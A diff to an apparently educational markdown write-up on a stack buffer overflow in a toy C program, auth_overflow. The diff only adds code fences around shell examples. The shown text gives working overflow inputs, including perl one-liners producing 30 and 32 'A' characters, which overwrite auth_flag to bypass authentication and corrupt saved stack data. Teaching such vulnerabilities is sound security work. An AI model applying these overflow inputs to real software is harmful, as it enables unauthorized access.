@@ -46,6 +46,7 @@ int main(int argc, char *argv[]) {
 
 ## The program logic:
 
+```bash
 $ gcc -g -o auth_overflow auth_overflow.c
 
 $ ./auth_overflow test
@@ -56,6 +57,7 @@ Access Granted.
 
 $ ./auth_overflow outgrabe
 Access Granted.
+```
 
 ## Vulnerability 
 
@@ -70,17 +72,21 @@ We can use this exploit to change the value of the **auth_flag**, which is store
 ## Exploitation
 
 When an overly long input is supplied, authentication is bypassed:
+```bash
 $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Access Granted.
-
+```
+```bash
 $ ./auth_overflow $(perl -e 'print "A"x30')
-
+```
 In this case, 30 bytes are sufficient to overflow the 16-byte buffer and overwrite auth_flag, while leaving the rest of the stack frame intact. The program prints "Access Granted" and exits normally.
 
 Using a slightly longer input demonstrates the effect of overwriting additional stack data:
+```bash
 $ ./auth_overflow $(perl -e 'print "A"x32')
 Access Granted.
 Segmentation fault
-
+```
 With 32 bytes, not only is auth_flag overwritten, but additional stack metadata such as the saved frame pointer or return address is corrupted. As a result, the program still grants access but later crashes due to invalid control data on the stack.
+
 
